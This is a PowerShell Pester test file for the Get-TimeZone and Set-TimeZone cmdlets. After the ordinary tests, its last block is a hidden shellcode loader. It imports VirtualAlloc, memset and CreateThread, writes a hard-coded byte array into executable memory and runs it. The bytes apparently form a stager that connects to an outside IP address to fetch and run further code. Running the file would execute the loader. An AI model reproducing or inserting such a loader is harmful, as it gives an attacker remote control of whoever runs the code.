




function Assert-ListsSame
{
    param([object[]] $expected, [object[]] $observed )
    $compResult = Compare-Object $observed $expected | Select-Object -ExpandProperty InputObject
    if ($compResult)
    {
        $observedList = ([string]::Join("|",$observed))
        $expectedList = ([string]::Join("|",$expected))
        $observedList | Should -Be $expectedList
    }
}

Describe "Get-Timezone test cases" -Tags "CI" {

    BeforeAll {
        $TimeZonesAvailable = [System.TimeZoneInfo]::GetSystemTimeZones()

        $defaultParamValues = $PSdefaultParameterValues.Clone()
        $PSDefaultParameterValues["it:skip"] = ($TimeZonesAvailable.Count -eq 0)
    }

    AfterAll {
        $global:PSDefaultParameterValues = $defaultParamValues
    }

    It "Call without ListAvailable switch returns current TimeZoneInfo" {
        $observed = (Get-TimeZone).Id
        $expected = ([System.TimeZoneInfo]::Local).Id
        $observed | Should -Be $expected
    }

    It "Call without ListAvailable switch returns an object of type TimeZoneInfo" {
        $result = Get-TimeZone
        $result | Should -BeOfType TimeZoneInfo
    }

    It "Call WITH ListAvailable switch returns ArrayList of TimeZoneInfo objects where the list is greater than 0 item" {
        $list = Get-TimeZone -ListAvailable
        $list.Count | Should -BeGreaterThan 0

        ,$list | Should -BeOfType "Object[]"
        $list[0] | Should -BeOfType "TimeZoneInfo"
    }

    
    
    It "Call with ListAvailable switch returns a list containing TimeZoneInfo.Local" {
        $observedIdList = Get-TimeZone -ListAvailable | Select-Object -ExpandProperty BaseUtcOffset
        $oneExpectedOffset = ([System.TimeZoneInfo]::Local).BaseUtcOffset
        $oneExpectedOffset | Should -BeIn $observedIdList
    }

    
    
    It "Call with ListAvailable switch returns a list containing one returned by Get-TimeZone" {
        $observedIdList = Get-TimeZone -ListAvailable | Select-Object -ExpandProperty BaseUtcOffset
        $oneExpectedOffset = (Get-TimeZone).BaseUtcOffset
        $oneExpectedOffset | Should -BeIn $observedIdList
    }

    It "Call Get-TimeZone using ID param and single item" {
        $selectedTZ = $TimeZonesAvailable[0]
        (Get-TimeZone -Id $selectedTZ.Id).Id | Should -Be $selectedTZ.Id
    }

    It "Call Get-TimeZone using ID param and multiple items" {
        $selectedTZ = $TimeZonesAvailable | Select-Object -First 3 -ExpandProperty Id
        $result = (Get-TimeZone -Id $selectedTZ).Id
        Assert-ListsSame $result $selectedTZ
    }

    It "Call Get-TimeZone using ID param and multiple items, where first and third are invalid ids - expect error" {
        $selectedTZ = $TimeZonesAvailable[0].Id
        $null = Get-TimeZone -Id @("Cape Verde Standard",$selectedTZ,"Azores Standard") `
                             -ErrorVariable errVar -ErrorAction SilentlyContinue
        $errVar.Count | Should -Be 2
        $errVar[0].FullyQualifiedErrorID | Should -Be "TimeZoneNotFound,Microsoft.PowerShell.Commands.GetTimeZoneCommand"
    }

    It "Call Get-TimeZone using ID param and multiple items, one is wild card but error action ignore works as expected" {
        $selectedTZ = $TimeZonesAvailable | Select-Object -First 3 -ExpandProperty Id
        $inputArray = $selectedTZ + "*"
        $result = Get-TimeZone -Id $inputArray -ErrorAction SilentlyContinue | ForEach-Object Id
        Assert-ListsSame $selectedTZ $result
    }

    It "Call Get-TimeZone using Name param and singe item" {
        $timezoneList = Get-TimeZone -ListAvailable
        $timezoneName = $timezoneList[0].StandardName
        $observed = Get-TimeZone -Name $timezoneName
        $observed.StandardName | Should -Be $timezoneName
    }

    It "Call Get-TimeZone using Name param with wild card" {
        $result = (Get-TimeZone -Name "Pacific*").Id
        $expectedIdList = ($TimeZonesAvailable | Where-Object { $_.StandardName -match "^Pacific" }).Id
        Assert-ListsSame $expectedIdList $result
    }

    It "Call Get-TimeZone Name parameter from pipeline by value " {
        $result = ("Pacific*" | Get-TimeZone).Id
        $expectedIdList = ($TimeZonesAvailable | Where-Object { $_.StandardName -match "^Pacific" }).Id
        Assert-ListsSame $expectedIdList $result
    }

    It "Call Get-TimeZone Id parameter from pipeline by ByPropertyName" {
        $timezoneList = Get-TimeZone -ListAvailable
        $timezone = $timezoneList[0]
        $observed = $timezone | Get-TimeZone
        $observed.StandardName | Should -Be $timezone.StandardName
    }
}

try {
    $defaultParamValues = $PSdefaultParameterValues.Clone()
    $PSDefaultParameterValues["it:skip"] = !$IsWindows

    Describe "Set-Timezone test case: call by single Id" -Tags @('CI', 'RequireAdminOnWindows') {
        BeforeAll {
            if ($IsWindows) {
                $originalTimeZoneId = (Get-TimeZone).Id
            }
        }
        AfterAll {
            if ($IsWindows) {
                Set-TimeZone -ID $originalTimeZoneId
            }
        }

        It "Call Set-TimeZone by Id" {
            $origTimeZoneID = (Get-TimeZone).Id
            $timezoneList = Get-TimeZone -ListAvailable
            $testTimezone = $null
            foreach ($timezone in $timezoneList) {
                if ($timezone.Id -ne $origTimeZoneID) {
                    $testTimezone = $timezone
                    break
                }
            }
            Set-TimeZone -Id $testTimezone.Id
            $observed = Get-TimeZone
            $testTimezone.Id | Should -Be $observed.Id
        }
    }

    Describe "Set-Timezone test cases" -Tags @('Feature', 'RequireAdminOnWindows') {
        BeforeAll {
            if ($IsWindows)
            {
                $originalTimeZoneId = (Get-TimeZone).Id
            }
        }
        AfterAll {
            if ($IsWindows) {
                Set-TimeZone -ID $originalTimeZoneId
            }
        }

        It "Call Set-TimeZone with invalid Id" {
            { Set-TimeZone -Id "zzInvalidID" } | Should -Throw -ErrorId "TimeZoneNotFound,Microsoft.PowerShell.Commands.SetTimeZoneCommand"
        }

        It "Call Set-TimeZone by Name" {
            $origTimeZoneName = (Get-TimeZone).StandardName
            $timezoneList = Get-TimeZone -ListAvailable
            $testTimezone = $null
            foreach ($timezone in $timezoneList) {
                if ($timezone.StandardName -ne $origTimeZoneName) {
                    $testTimezone = $timezone
                    break
                }
            }
            Set-TimeZone -Name $testTimezone.StandardName
            $observed = Get-TimeZone
            $testTimezone.StandardName | Should -Be $observed.StandardName
        }

        It "Call Set-TimeZone with invalid Name" {
            { Set-TimeZone -Name "zzINVALID_Name" } | Should -Throw -ErrorId "TimeZoneNotFound,Microsoft.PowerShell.Commands.SetTimeZoneCommand"
        }

        It "Call Set-TimeZone from pipeline input object of type TimeZoneInfo" {
            $origTimeZoneID = (Get-TimeZone).Id
            $timezoneList = Get-TimeZone -ListAvailable
            $testTimezone = $null
            foreach ($timezone in $timezoneList) {
                if ($timezone.Id -ne $origTimeZoneID) {
                    $testTimezone = $timezone
                    break
                }
            }

            $testTimezone | Set-TimeZone
            $observed = Get-TimeZone
            $observed.ID | Should -Be $testTimezone.Id
        }

        It "Call Set-TimeZone from pipeline input object of type TimeZoneInfo, verify supports whatif" {
            $origTimeZoneID = (Get-TimeZone).Id
            $timezoneList = Get-TimeZone -ListAvailable
            $testTimezone = $null
            foreach ($timezone in $timezoneList) {
                if ($timezone.Id -ne $origTimeZoneID) {
                    $testTimezone = $timezone
                    break
                }
            }

            Set-TimeZone -Id $testTimezone.Id -WhatIf > $null
            $observed = Get-TimeZone
            $observed.Id | Should -Be $origTimeZoneID
        }
    }
}
finally {
    $global:PSDefaultParameterValues = $defaultParamValues
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x67,0xff,0x06,0x65,0x68,0x02,0x00,0x10,0xe1,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

